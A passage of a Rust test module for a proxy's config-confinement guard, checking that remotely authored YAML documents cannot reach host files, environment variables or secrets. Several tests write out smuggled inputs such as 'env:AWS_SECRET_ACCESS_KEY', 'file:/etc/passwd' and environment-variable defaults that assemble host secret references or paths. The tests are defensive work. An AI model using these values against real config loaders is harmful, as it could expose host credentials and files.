            "an inline PEM supplied through a secret reference, which the host-backed \
             secret refusal already screens; there is no path to open",
        ),
        (
            "proxy.device_parser_file",
            "`compile_config` refuses the key outright: this build has no code path \
             that loads a device-parser catalog from disk, so the key never named a \
             file the proxy opened",
        ),
        (
            "origin_sources.entries[].path",
            "a path inside the project repository, relative to its root, not a path on this \
             host. It names the profile document the aggregator reads out of a clone it made \
             itself, and nothing on this node opens it. The block is on \
             `crate::AUTHORITY_DENIED_PATHS`, so no externally authored document sets it, and \
             a project profile has no field that could hold it either",
        ),
        (
            "origin_sources.entries[].credential",
            "matches `file` and `path` inside the `file:/path` spelling the description lists \
             as one accepted reference form. The value is a secret reference resolved by the \
             process secret resolver, not a path this key opens, and the same reference \
             vocabulary is screened by `host_backed_secret_reference` wherever an externally \
             authored document could carry it. Here it cannot: `origin_sources` is on \
             `crate::AUTHORITY_DENIED_PATHS` and is written only in the runtime config the \
             operator owns, exactly like `source.credential`",
        ),
        (
            "source.path",
            "a path inside the repository, relative to its root, not a path on this \
             host. A fetched document's own `source:` is never handed back to git \
             (the loader reads `source:` from the operator's local pointer file) and \
             `source` is on `crate::AUTHORITY_DENIED_PATHS`. `source.base.path` and \
             `source.overlays[].path` are the same key one level down and do not \
             appear in the sweep: `ConfigSource` refers to itself, and the walk's \
             cycle guard stops at the first repeat",
        ),
    ];

    /// Whether a dotted schema path is covered by a `HOST_FILE_KEYS`
    /// entry, asked through the same [`KeyScope::covers`] the walk uses
    /// so the test cannot drift from the enforcement.
    fn a_host_file_key_covers(dotted: &str) -> bool {
        let segments: Vec<&str> = dotted
            .split('.')
            .map(|segment| segment.strip_suffix("[]").unwrap_or(segment))
            .collect();
        let Some((key, above)) = segments.split_last() else {
            return false;
        };
        let ancestry = Ancestry {
            grandparent: above
                .len()
                .checked_sub(2)
                .and_then(|i| above.get(i).copied()),
            parent: above.last().copied(),
        };
        HOST_FILE_KEYS
            .iter()
            .any(|entry| entry.key == *key && entry.scope.covers(ancestry))
    }

    /// Whether a schema property name carries one of the path markers.
    fn a_schema_key_name_is_path_shaped(name: &str) -> bool {
        let lowered = name.to_ascii_lowercase();
        SCHEMA_PATH_MARKERS
            .iter()
            .any(|marker| lowered.contains(marker))
    }

    /// Whether a property description carries one of the path stems at
    /// a word boundary.
    ///
    /// Word-boundary prefix matching, which is what keeps `profile`
    /// from counting as `file` while `filesystem` does count. Only the
    /// first sentence-bearing line is read: a schema description's
    /// summary line is what states what the value *is*, and the
    /// paragraphs under it discuss everything around it.
    fn a_schema_description_is_path_shaped(description: &str) -> bool {
        let first_line = description.lines().next().unwrap_or_default();
        first_line
            .split(|character: char| !character.is_ascii_alphanumeric() && character != '_')
            .any(|word| {
                let lowered = word.to_ascii_lowercase();
                SCHEMA_PATH_DESCRIPTION_STEMS
                    .iter()
                    .any(|stem| lowered.starts_with(stem))
            })
    }

    /// The first description this node or anything it composes carries.
    ///
    /// `schemars` puts the doc comment on the `$ref` target for a named
    /// type and on the property for an inline one, so a sweep that read
    /// only the property would miss half of them.
    fn first_schema_description(
        node: &serde_json::Value,
        definitions: &serde_json::Map<String, serde_json::Value>,
        visiting: &mut Vec<String>,
    ) -> Option<String> {
        let object = node.as_object()?;
        if let Some(description) = object
            .get("description")
            .and_then(serde_json::Value::as_str)
        {
            return Some(description.to_string());
        }
        if let Some(reference) = object.get("$ref").and_then(serde_json::Value::as_str) {
            let name = reference.strip_prefix("#/definitions/")?;
            if visiting.iter().any(|seen| seen == name) {
                return None;
            }
            visiting.push(name.to_string());
            let found = definitions
                .get(name)
                .and_then(|target| first_schema_description(target, definitions, visiting));
            visiting.pop();
            return found;
        }
        ["allOf", "anyOf", "oneOf"].iter().find_map(|branch| {
            object
                .get(*branch)
                .and_then(serde_json::Value::as_array)
                .into_iter()
                .flatten()
                .find_map(|schema| first_schema_description(schema, definitions, visiting))
        })
    }

    /// Whether this schema node accepts a string, following `$ref` and
    /// the three composition keywords.
    fn a_schema_node_accepts_a_string(
        node: &serde_json::Value,
        definitions: &serde_json::Map<String, serde_json::Value>,
        visiting: &mut Vec<String>,
    ) -> bool {
        let Some(object) = node.as_object() else {
            return false;
        };
        if let Some(reference) = object.get("$ref").and_then(serde_json::Value::as_str) {
            let Some(name) = reference.strip_prefix("#/definitions/") else {
                return false;
            };
            if visiting.iter().any(|seen| seen == name) {
                return false;
            }
            visiting.push(name.to_string());
            let answer = definitions.get(name).is_some_and(|target| {
                a_schema_node_accepts_a_string(target, definitions, visiting)
            });
            visiting.pop();
            return answer;
        }
        match object.get("type") {
            Some(serde_json::Value::String(name)) if name == "string" => return true,
            Some(serde_json::Value::Array(names))
                if names.iter().any(|name| name.as_str() == Some("string")) =>
            {
                return true
            }
            _ => {}
        }
        ["allOf", "anyOf", "oneOf"].iter().any(|branch| {
            object
                .get(*branch)
                .and_then(serde_json::Value::as_array)
                .into_iter()
                .flatten()
                .any(|schema| a_schema_node_accepts_a_string(schema, definitions, visiting))
        })
    }

    /// Collect every path-shaped string property, as a dotted config
    /// path: `[]` for a sequence, `*` for an operator-named key.
    fn walk_schema_for_path_shaped_keys<'a>(
        node: &'a serde_json::Value,
        path: &str,
        definitions: &'a serde_json::Map<String, serde_json::Value>,
        visiting: &mut Vec<&'a str>,
        found: &mut std::collections::BTreeSet<String>,
        reached: &mut std::collections::BTreeSet<&'a str>,
    ) {
        let Some(object) = node.as_object() else {
            return;
        };
        if let Some(reference) = object.get("$ref").and_then(serde_json::Value::as_str) {
            let Some(name) = reference.strip_prefix("#/definitions/") else {
                return;
            };
            // A definition already on this descent is a cycle. Popping
            // afterwards is what lets the same definition be reached
            // again at another path, which is how `output.path` is found
            // under the access log and under every log sink.
            if visiting.contains(&name) {
                return;
            }
            let Some((key, target)) = definitions.get_key_value(name) else {
                return;
            };
            reached.insert(key.as_str());
            visiting.push(key.as_str());
            walk_schema_for_path_shaped_keys(target, path, definitions, visiting, found, reached);
            visiting.pop();
            return;
        }
        for branch in ["allOf", "anyOf", "oneOf"] {
            for schema in object
                .get(branch)
                .and_then(serde_json::Value::as_array)
                .into_iter()
                .flatten()
            {
                walk_schema_for_path_shaped_keys(
                    schema,
                    path,
                    definitions,
                    visiting,
                    found,
                    reached,
                );
            }
        }
        if let Some(properties) = object
            .get("properties")
            .and_then(serde_json::Value::as_object)
        {
            for (name, sub) in properties {
                let child = if path.is_empty() {
                    name.clone()
                } else {
                    format!("{path}.{name}")
                };
                if a_schema_node_accepts_a_string(sub, definitions, &mut Vec::new())
                    && (a_schema_key_name_is_path_shaped(name)
                        || first_schema_description(sub, definitions, &mut Vec::new())
                            .is_some_and(|text| a_schema_description_is_path_shaped(&text)))
                {
                    found.insert(child.clone());
                }
                walk_schema_for_path_shaped_keys(
                    sub,
                    &child,
                    definitions,
                    visiting,
                    found,
                    reached,
                );
            }
        }
        if let Some(additional) = object.get("additionalProperties") {
            if additional.is_object() {
                let child = if path.is_empty() {
                    "*".to_string()
                } else {
                    format!("{path}.*")
                };
                walk_schema_for_path_shaped_keys(
                    additional,
                    &child,
                    definitions,
                    visiting,
                    found,
                    reached,
                );
            }
        }
        if let Some(items) = object.get("items") {
            if items.is_object() {
                walk_schema_for_path_shaped_keys(
                    items,
                    &format!("{path}[]"),
                    definitions,
                    visiting,
                    found,
                    reached,
                );
            }
        }
    }

    /// WOR-2433 re-review rounds 3 and 4: the method that replaces
    /// "run the sweep again", widened until it covers every schema this
    /// repository generates.
    ///
    /// `HOST_FILE_KEYS` is a hand-written list, so the only question
    /// that matters about it is what it is missing, and no test that
    /// reads the list can answer that. This one reads the shipped
    /// schemas instead. Every string property whose **name** carries a
    /// path marker **or** whose **description** carries a path stem has
    /// to be on the list or on `SCHEMA_KEYS_THAT_ARE_NOT_HOST_PATHS`
    /// with a written reason.
    ///
    /// Three things this asserts, each one a way a previous round of
    /// this test was green while a host path went unguarded:
    ///
    /// * **All six schemas**, not just `sb-config`. Round 4 swept only
    ///   the top-level file, where `origins.*.ai` is untyped, and left
    ///   `serve.engines.<kind>.acquire.path` - a binary this node
    ///   executes - completely uncovered.
    /// * **Two signals**, not just the key name. Round 4 matched
    ///   markers in names only, so `proxy.acme.ca_root` was invisible
    ///   and `proxy.admin.tls.key` had to be added by hand.
    /// * **Every definition is reached.** A schema definition the walk
    ///   never enters is a whole struct's worth of keys nobody swept,
    ///   and the walk would stay green about it. This asserts the walk
    ///   touches all of them, so a `$ref` shape the traversal does not
    ///   understand fails here rather than silently narrowing the
    ///   sweep.
    #[test]
    fn every_path_shaped_schema_key_is_covered_or_explained() {
        let mut found = std::collections::BTreeSet::new();
        for (file, prefix) in GENERATED_SCHEMAS {
            let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("../../schemas")
                .join(file);
            let text = std::fs::read_to_string(&path)
                .unwrap_or_else(|error| panic!("`{file}` is readable: {error}"));
            let schema: serde_json::Value = serde_json::from_str(&text)
                .unwrap_or_else(|error| panic!("`{file}` parses: {error}"));
            let definitions = schema
                .get("definitions")
                .and_then(serde_json::Value::as_object)
                .cloned()
                .unwrap_or_default();
            let mut reached = std::collections::BTreeSet::new();
            walk_schema_for_path_shaped_keys(
                &schema,
                prefix,
                &definitions,
                &mut Vec::new(),
                &mut found,
                &mut reached,
            );
            let unreached: Vec<&String> = definitions
                .keys()
                .filter(|name| !reached.contains(name.as_str()))
                .collect();
            assert!(
                unreached.is_empty(),
                "the walk never entered these `{file}` definitions, so every key inside them \
                 went unswept: {unreached:#?}",
            );
        }

        // A sweep that finds nothing would pass vacuously; the surface
        // has been in the dozens since this list existed and is over a
        // hundred across the six schemas.
        assert!(
            found.len() >= 120,
            "the sweep found only {} path-shaped keys across {} schemas, which means the \
             walk broke rather than that the surface shrank",
            found.len(),
            GENERATED_SCHEMAS.len(),
        );

        let uncovered: Vec<&String> = found
            .iter()
            .filter(|dotted| !a_host_file_key_covers(dotted))
            .filter(|dotted| {
                !SCHEMA_KEYS_THAT_ARE_NOT_HOST_PATHS
                    .iter()
                    .any(|(allowed, _)| *allowed == dotted.as_str())
            })
            .collect();
        assert!(
            uncovered.is_empty(),
            "these config keys look like a host path and are on neither HOST_FILE_KEYS nor \
             the allowlist: {uncovered:#?}",
        );

        for (allowed, reason) in SCHEMA_KEYS_THAT_ARE_NOT_HOST_PATHS {
            assert!(
                found.contains(*allowed),
                "`{allowed}` is allowlisted but the sweep no longer finds it; delete the \
                 entry rather than leaving a stale excuse",
            );
            assert!(
                !a_host_file_key_covers(allowed),
                "`{allowed}` is both allowlisted and on HOST_FILE_KEYS; the list wins, so \
                 delete the allowlist entry",
            );
            assert!(!reason.is_empty(), "`{allowed}` has no reason");
        }
    }

    #[test]
    fn a_host_file_key_the_node_parameterizes_is_not_refused() {
        // The host-path half of the boundary is about who chose the
        // path, not about the key existing. A whole-value `${VAR}` is
        // the node's choice: `remote_document` keeps that spelling, the
        // pre-parse pass resolves it from the compiling machine's
        // environment, and an unset variable fails closed. Refusing it
        // would make `proxy.cluster.state_dir`, which a clustered node
        // must set and which is a path, impossible to configure from a
        // confined document at all.
        let policy = ConfinementPolicy::remote_document();
        check_confined_document(
            "acme/runtime-config",
            "proxy:\n  cluster:\n    state_dir: \"${SB_STATE_DIR}\"\n",
            &policy,
        )
        .expect("a path the node supplies through its own environment is not the document's");

        for chosen in [
            "proxy:\n  cluster:\n    state_dir: /var/lib/sbproxy\n",
            "proxy:\n  cluster:\n    state_dir: \"${SB_STATE_DIR:-/etc/cron.d}\"\n",
            "proxy:\n  cluster:\n    state_dir: \"/srv/${SB_TENANT}\"\n",
        ] {
            let error = check_confined_document("acme/runtime-config", chosen, &policy)
                .expect_err("a path the document chose is refused");
            assert!(
                matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
                "{error:?}",
            );
        }
    }

    #[test]
    fn an_agent_skill_url_that_is_remote_is_still_allowed() {
        // The value-aware half of `agent_skills[].url`.
        // `resolve_artifact_bytes` fetches an absolute http(s) URL and
        // reads anything else off this host, so a name-only entry would
        // have had to choose between missing the read and refusing the
        // documented remote form.
        check_confined_document(
            "acme/runtime-config",
            "agent_skills:\n  - name: skill\n    url: https://example.test/skill.md\n",
            &ConfinementPolicy::remote_document(),
        )
        .expect("an absolute https url is fetched, not read off this host");
    }

    /// WOR-2433 re-review round 4, New 3. Both extension-code remedies
    /// on `HOST_FILE_KEYS` point at a `type: git` bundle source, and
    /// the `sources.path` entry refused exactly that, so the refusal's
    /// only remedy was refused by the same entry. A `type: git` path is
    /// a directory inside the fetched repository, not a path on this
    /// host.
    #[test]
    fn a_git_bundle_source_may_name_a_path_inside_its_own_repository() {
        let policy = ConfinementPolicy::remote_document();
        check_confined_document(
            "acme/runtime-config",
            concat!(
                "extensions:\n",
                "  sources:\n",
                "    - type: git\n",
                "      repo: https://example.test/bundles.git\n",
                "      revision: 1111111111111111111111111111111111111111\n",
                "      path: bundles/edge\n",
            ),
            &policy,
        )
        .expect("an in-repository bundle directory is the document's own tree");

        // And it still has to stay inside the checkout: the extension
        // loader only checks that the path is non-empty.
        for escape in ["/etc/sbproxy/bundles", "../../etc", "~/bundles"] {
            let document = format!(
                "extensions:\n  sources:\n    - type: git\n      repo: https://example.test/b.git\n      revision: 1111111111111111111111111111111111111111\n      path: {escape}\n"
            );
            let error = check_confined_document("acme/runtime-config", &document, &policy)
                .expect_err("a git source path that leaves the checkout is a host read");
            assert!(
                matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
                "{error:?}",
            );
        }

        // A source with no `type:` at all is refused rather than waved
        // through, which is the direction every other ambiguity takes.
        check_confined_document(
            "acme/runtime-config",
            "extensions:\n  sources:\n    - path: bundles/edge\n",
            &policy,
        )
        .expect_err("a source whose variant cannot be read is refused");
    }

    /// The remote spellings of the other two value-aware entries this
    /// round added stay legal, which is what keeps the guard from being
    /// a refusal with no remedy.
    #[test]
    fn the_remote_form_of_a_lora_adapter_and_a_classifier_endpoint_is_allowed() {
        let policy = ConfinementPolicy::remote_document();
        check_confined_document(
            "acme/runtime-config",
            concat!(
                "origins:\n  api:\n    ai:\n      providers:\n        - name: local\n",
                "          serve:\n            models:\n              - name: m\n",
                "                lora_adapters:\n                  - name: a\n",
                "                    source: hf:Org/Adapter\n",
            ),
            &policy,
        )
        .expect("an `hf:` adapter reference is a fetch, not a host read");
        check_confined_document(
            "acme/runtime-config",
            concat!(
                "origins:\n  api:\n    action:\n      type: ai_proxy\n",
                "      compression:\n        levers:\n          - type: token_prune\n",
                "            endpoint: http://classifier.internal:9000\n",
            ),
            &policy,
        )
        .expect("a network classifier endpoint is an egress destination, not a host socket");
    }

    #[test]
    fn an_agent_skill_url_with_leading_space_is_a_host_read_to_both_sides() {
        // The predicate used to `trim()` and `resolve_artifact_bytes`
        // does not, so ` https://example.test/x` was remote to the guard
        // and a host read to the enforcer, which is the
        // detector-narrower-than-the-enforcer shape at the one key this
        // module made value-aware (WOR-2433 re-review round 3).
        let error = check_confined_document(
            "acme/runtime-config",
            "agent_skills:\n  - name: skill\n    url: \" https://example.test/skill.md\"\n",
            &ConfinementPolicy::remote_document(),
        )
        .expect_err("the enforcer reads this off the disk, so the guard must refuse it");
        assert!(
            matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
            "{error:?}",
        );
    }

    /// WOR-2433 re-review round 3, Blocker 1, in value position.
    ///
    /// `remote_document` grants `${VAR}`, so `refuse_env_references`
    /// returns `Ok` on any placeholder, and `host_backed_secret_reference`
    /// is prefix-anchored on the raw value, so
    /// `${SB_NOPE:-env:AWS_SECRET_ACCESS_KEY}` matched none of `env:`,
    /// `file:` or `vault://env/`. The compile then substituted the
    /// document's own default in and handed `env:AWS_SECRET_ACCESS_KEY`
    /// to the vault resolver, which is the exact outcome this ticket
    /// exists to close.
    #[test]
    fn a_document_written_default_cannot_assemble_a_host_secret_reference() {
        let document = concat!(
            "origins:\n",
            "  api:\n",
            "    authentication:\n",
            "      type: api_key\n",
            "      api_key: \"${SB_NOPE_2433:-env:AWS_SECRET_ACCESS_KEY}\"\n",
        );
        let error = check_confined_document(
            "acme/runtime-config",
            document,
            &ConfinementPolicy::remote_document(),
        )
        .expect_err("a default the document wrote is document text, not a node value");
        match &error {
            ConfinedTemplateError::HostReachingDefault { path, .. } => {
                assert!(path.ends_with("api_key"), "refused at `{path}`");
            }
            other => panic!("expected a HostReachingDefault refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(
            !rendered.contains("AWS_SECRET_ACCESS_KEY"),
            "the refusal echoed the default it refused: {rendered}",
        );

        // And the substituted view catches the same thing a second way,
        // which is what covers the shapes the default-content rule does
        // not name: strip the `env:` and the walk over the filled-in
        // document is the only thing left standing.
        let assembled = document.replace(
            "${SB_NOPE_2433:-env:AWS_SECRET_ACCESS_KEY}",
            "${SB_NOPE_2433:-env}:AWS_SECRET_ACCESS_KEY",
        );
        let error = check_confined_document(
            "acme/runtime-config",
            &assembled,
            &ConfinementPolicy::remote_document(),
        )
        .expect_err("a value assembled around a default is still document text");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}",
        );
    }

    /// WOR-2433 re-review round 3, Blocker 1, in mapping-key position.
    ///
    /// `HOST_FILE_KEYS` is matched on the raw key text, so a key spelled
    /// `"${SB_NOPE:-path}"` under `action:` met no entry; the pre-parse
    /// pass then substituted the document's own default and the compile
    /// saw `action.path: /etc`, which roots the storage action's object
    /// store at the host filesystem.
    #[test]
    fn a_document_written_default_cannot_assemble_a_host_file_key() {
        let document = concat!(
            "origins:\n",
            "  api:\n",
            "    action:\n",
            "      type: storage\n",
            "      backend: local\n",
            "      \"${SB_NOPE_2433:-path}\": /etc\n",
        );
        let error = check_confined_document(
            "acme/runtime-config",
            document,
            &ConfinementPolicy::remote_document(),
        )
        .expect_err("a mapping key the document assembles is still a mapping key");
        match &error {
            ConfinedTemplateError::HostFileInlining { path, .. } => {
                assert!(path.ends_with("path"), "refused at `{path}`");
            }
            other => panic!("expected a HostFileInlining refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains("/etc"),
            "the refusal echoed the path it refused: {error}",
        );
    }

    #[test]
    fn a_default_that_names_an_absolute_path_is_refused_on_any_key() {
        // `HOST_FILE_KEYS` is a list of keys, so a path a default
        // assembles can land on a key nobody added to it. Refused
        // wherever it appears, which over-refuses a URL path on purpose;
        // the literal and the bare `${VAR}` are both still legal.
        let policy = ConfinementPolicy::remote_document();
        for document in [
            "origins:\n  api:\n    action:\n      type: proxy\n      url: \"${SB_NOPE_2433:-/etc/sbproxy/x}\"\n",
            "origins:\n  api:\n    action:\n      type: proxy\n      url: \"${SB_NOPE_2433:-~/x}\"\n",
        ] {
            let error = check_confined_document("acme/runtime-config", document, &policy)
                .expect_err("a host path in a default is a host path");
            assert!(
                matches!(error, ConfinedTemplateError::HostReachingDefault { .. }),
                "{error:?}",
            );
        }

        // The two legal spellings, and the ordinary default that must
        // keep working: a fleet document naming a per-node value.
        for document in [
            "origins:\n  api:\n    action:\n      type: proxy\n      url: /etc/sbproxy/x\n",
            "origins:\n  api:\n    action:\n      type: proxy\n      url: \"${SB_NOPE_2433}\"\n",
            "origins:\n  api:\n    action:\n      type: proxy\n      url: \"${SB_NOPE_2433:-https://test.sbproxy.dev}\"\n",
        ] {
            check_confined_document("acme/runtime-config", document, &policy)
                .expect("a literal, a bare `${VAR}`, and an ordinary default all stay legal");
        }
    }

    #[test]
    fn filling_document_written_defaults_mirrors_the_substitution_pass() {
        // The confinement view has to be the enforcer's own scan with
        // one substitution held back, or it is a second implementation
        // waiting to drift. `${VAR}` is the node's bytes and stays;
        // everything the enforcer leaves literal stays literal too.
        for (input, expected) in [
            ("${SB_X:-fallback}", "fallback"),
            ("a ${SB_X:-b} c", "a b c"),
            ("${SB_X}", "${SB_X}"),
            ("$${SB_X:-b}", "$${SB_X:-b}"),
            ("${}", "${}"),
            ("${SB_X:-b", "${SB_X:-b"),
            // MCP runtime vocabulary: not an env reference, so the
            // substitution pass never touches it and neither does this.
            ("${args.id:-b}", "${args.id:-b}"),
            ("${steps.fetch.body.x:-b}", "${steps.fetch.body.x:-b}"),
        ] {
            assert_eq!(
                fill_document_written_defaults(input),
                expected,
                "input {input:?}",
            );
        }
    }

    #[test]
    fn a_confined_document_may_name_its_shared_key_as_a_variable() {
        // The justification for `source.confine` defaulting to off used
        // to say that sealing a git source would leave a clustered node
        // with no legal spelling for its cluster secret, because
        // `proxy.cluster.security.shared_key` accepts only `env:` and
        // `file:`. That is false, and this is the test that says so:
        // `remote_document` keeps `${VAR}`, the pre-parse pass
        // substitutes it, and the shared-key validator runs on the
        // substituted value against the 16-byte inline floor. The
        // default is still off, for the reasons the module docs now
        // give (a fail-closed upgrade on running fleets, and host paths
        // having no substitute spelling), and this pins the correction
        // so a future reader does not decide the default on a claim
        // that was never true (WOR-2433 re-review).
        let _env = EnvVarGuard::set(&[
            (SECRET_VAR, Some(SECRET_VALUE)),
            (
                "SBPROXY_CONFINED_TEST_STATE_DIR",
                Some("/var/lib/sbproxy/confined-test"),
            ),
        ]);
        assert!(
            SECRET_VALUE.len() >= 16,
            "the fixture value has to clear the inline-entropy floor",
        );
        let document = format!(
            "proxy:\n  http_bind_port: 8080\n  cluster:\n    cluster_id: prod-a\n    node_id: worker-a\n    roles: [gateway]\n    state_dir: \"${{SBPROXY_CONFINED_TEST_STATE_DIR}}\"\n    security:\n      mode: shared_key\n      development: true\n      shared_key: \"${{{SECRET_VAR}}}\"\norigins:\n  \"edge.example.com\":\n    action:\n      type: proxy\n      url: https://test.sbproxy.dev\n"
        );

        check_confined_document(
            "acme/runtime-config",
            &document,
            &ConfinementPolicy::remote_document(),
        )
        .expect("a confined document may still name a per-node variable");
        crate::compile_config(&document)
            .expect("the substituted shared key clears the inline-entropy floor");

        // The contrast, and the half of the round-1 reasoning that does
        // hold: the documented `env:` spelling is refused, so this is a
        // migration cost rather than an impossibility.
        let with_env_reference =
            document.replace(&format!("${{{SECRET_VAR}}}"), &format!("env:{SECRET_VAR}"));
        let error = check_confined_document(
            "acme/runtime-config",
            &with_env_reference,
            &ConfinementPolicy::remote_document(),
        )
        .expect_err("`env:` is the spelling confinement does take away");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}",
        );
    }

    #[test]
    fn a_parent_scoped_host_file_key_is_not_refused_under_another_parent() {
        // `path` is a host-file key under `bulk_list` and ordinary
        // config text everywhere else. A guard that refused every `path`
        // would refuse a `source:` block, an `origins.*.path` route, and
        // most of the routing vocabulary with it.
        check_confined_document(
            "acme/runtime-config",
            "source:\n  kind: git\n  path: sb.yml\norigins:\n  api:\n    match:\n      path: /v1\n",
            &ConfinementPolicy::remote_document(),
        )
        .expect("`path` outside `bulk_list` is ordinary config text");
    }

    #[test]
    fn a_complex_mapping_key_naming_a_variable_is_refused() {
        let _env = secret_env();
        // A YAML explicit key whose value is a sequence. The walk used
        // to scan `key.as_str()` only, so this shape went past the key
        // scan entirely and was re-serialized with the placeholder
        // intact for `interpolate_env_vars` to substitute later.
        let fragment = format!("headers:\n  ? [ \"${{{SECRET_VAR}}}\" ]\n  : {{}}\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a complex mapping key must be scanned like any other text");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert!(path.contains("mapping key"), "{path}");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_host_backed_secret_reference_in_a_complex_key_is_refused() {
        let fragment = "routes:\n  ? [ \"env:AWS_SECRET_ACCESS_KEY\" ]\n  : {}\n";
        let error = resolve_confined_fragment("acme/api", fragment, &bindings(&[]))
            .expect_err("a key is text too, and both scans run on it");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}"
        );
    }

    #[test]
    fn a_remote_document_keeps_env_interpolation_and_loses_the_other_two() {
        let _env = secret_env();
        let policy = ConfinementPolicy::remote_document();
        // `${VAR}` is the documented and only supported way to run one
        // shared document across a fleet, so it survives.
        check_confined_document(
            "acme/runtime-config",
            &format!("proxy:\n  cluster:\n    node_id: \"${{{SECRET_VAR}}}\"\n"),
            &policy,
        )
        .expect("a remote document may still name per-node variables");
        // `{{vars.X}}` is left for the fleet-wide pass, not resolved
        // here and not refused as unbound.
        check_confined_document(
            "acme/runtime-config",
            "origins:\n  api:\n    action:\n      url: \"https://{{vars.upstream}}\"\n",
            &policy,
        )
        .expect("a remote document's variables resolve later, against the origin");
        // The two powers it never had.
        let error = check_confined_document(
            "acme/runtime-config",
            &format!(
                "origins:\n  api:\n    authentication:\n      api_key: \"env:{SECRET_VAR}\"\n"
            ),
            &policy,
        )
        .expect_err("a remote document may not read this node's environment");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}"
        );
        assert!(!error.to_string().contains(SECRET_VALUE));
        let error = check_confined_document(
            "acme/runtime-config",
            "origins:\n  api:\n    request_modifiers:\n      - rego_module_path: /etc/x.rego\n",
            &policy,
        )
        .expect_err("a remote document may not name a path on this node");
        assert!(
            matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
            "{error:?}"
        );
    }

    #[test]
    fn a_bundle_authored_value_resolves_no_reference_of_any_kind() {
        let _env = secret_env();
        let policy = ConfinementPolicy::bundle_manifest();
        // The three host-backed spellings keep their own message,
        // because the author needs to know which one they wrote.
        for value in [
            format!("env:{SECRET_VAR}"),
            "file:/etc/passwd".to_string(),
            format!("vault://env/{SECRET_VAR}"),
        ] {
            let error = check_confined_value("acme-bundle", "token", &value, &policy)
                .expect_err("a bundle manifest may not resolve a host-backed reference");
            assert!(
                matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
                "{error:?}"
            );
            let rendered = error.to_string();
            assert!(rendered.contains("acme-bundle"), "{rendered}");
            assert!(rendered.contains("token"), "{rendered}");
            assert!(!rendered.contains(SECRET_VALUE), "{rendered}");
            assert!(
                !rendered.contains("/etc/passwd"),
                "the refusal echoed the value: {rendered}"
            );
        }
        // A whole-value `${VAR}` is the same environment read spelled as
        // a template, and the bundle path resolves it too.
        let error = check_confined_value(
            "acme-bundle",
            "token",
            &format!("${{{SECRET_VAR}}}"),
            &policy,
        )
        .expect_err("a bundle manifest may not name a process variable");
        assert!(
            matches!(error, ConfinedTemplateError::EnvReference { .. }),
            "{error:?}"
        );
        assert!(!error.to_string().contains(SECRET_VALUE));
        // A provider URI is allowed everywhere else, and refused here:
        // the bundle would be choosing which of the operator's declared
        // secrets its own guest code gets to read.
        let error =
            check_confined_value("acme-bundle", "token", "secret://prod/db-password", &policy)
                .expect_err("a bundle manifest may not name an operator backend either");
        match &error {
            ConfinedTemplateError::SecretReference { fragment, path } => {
                assert_eq!(fragment, "acme-bundle");
                assert_eq!(path, "token");
            }
            other => panic!("expected a SecretReference refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains("db-password"),
            "the refusal echoed the reference: {error}"
        );
        // A literal is not a reference, and nothing here rewrites it.
        check_confined_value("acme-bundle", "threshold", "12", &policy)
            .expect("a plain value is not a secret reference");
        check_confined_value("acme-bundle", "label", "not-a-reference", &policy)
            .expect("a plain value is not a secret reference");
    }

    #[test]
    fn only_the_bundle_policy_withholds_an_operator_declared_backend() {
        // The asymmetry is the point: a fragment's provider URI still
        // resolves (pinned above for the document walk), and the bundle
        // policy is the only one that takes it away.
        for policy in [
            ConfinementPolicy::sealed(),
            ConfinementPolicy::remote_document(),
        ] {
            check_confined_value("acme/api", "api_key", "secret://prod/key", &policy)
                .expect("an operator-declared backend still resolves outside a bundle manifest");
        }
    }

    #[test]
    fn checking_a_document_never_rewrites_it() {
        // The publish path signs a digest over the payload and the
        // subscriber diffs it, so a check that returned modified text
        // would be a correctness bug rather than a convenience.
        let yaml = "origins:\n  api:\n    action:\n      url: \"https://{{vars.x}}/$${HOME}\"\n";
        let before = yaml.to_string();
        check_confined_document("acme/doc", yaml, &ConfinementPolicy::remote_document())
            .expect("nothing here is refused");
        assert_eq!(yaml, before);
    }

    #[test]
    fn the_confined_refusal_set_is_exactly_what_the_env_pass_would_read() {
        // The detector-vs-enforcer check. For each form, ask the shipped
        // fleet-wide pass whether it reads the environment (its output
        // changes when the variable is set), then require the confined
        // pass to refuse exactly those. A carve-out that drifted wider
        // or narrower than `interpolate_env_vars` fails here.
        let _env = secret_env();
        let forms = [
            format!("${{{SECRET_VAR}}}"),
            format!("${{{SECRET_VAR}:-fallback}}"),
            format!("$${{{SECRET_VAR}}}"),
            format!("${{args.{SECRET_VAR}}}"),
            format!("${{steps.fetch.{SECRET_VAR}}}"),
            "${method}".to_string(),
            // The three forms the two sides used to disagree on, which
            // is the whole point of a biconditional and which the first
            // version of this test did not contain (WOR-2433 review).
            // `${}` lost its closing brace on the enforcer side;
            // `${request.header.X}` and `${attribution.X}` are
            // documented access-log runtime vocabulary that the confined
            // pass refused as process variables.
            "${}".to_string(),
            "${request.header.X-Request-Id}".to_string(),
            "${attribution.team}".to_string(),
            "plain text with no placeholder".to_string(),
        ];
        for form in &forms {
            let enforcer_reads_env = interpolate_env_vars(form) != *form;
            let fragment = serde_yaml::to_string(&serde_json::json!({ "field": form }))
                .expect("fixture serializes");
            let confined_refuses =
                resolve_confined_fragment("acme/api", &fragment, &bindings(&[])).is_err();
            assert_eq!(
                confined_refuses, enforcer_reads_env,
                "confined refusal and env-pass behavior disagree on {form:?}"
            );
        }
    }

    #[test]
    fn operator_authored_config_still_reads_the_environment() {
        // The confined pass is a second door, not a change to the first
        // one. Same text, the fleet-wide pass, still resolves.
        let _env = secret_env();
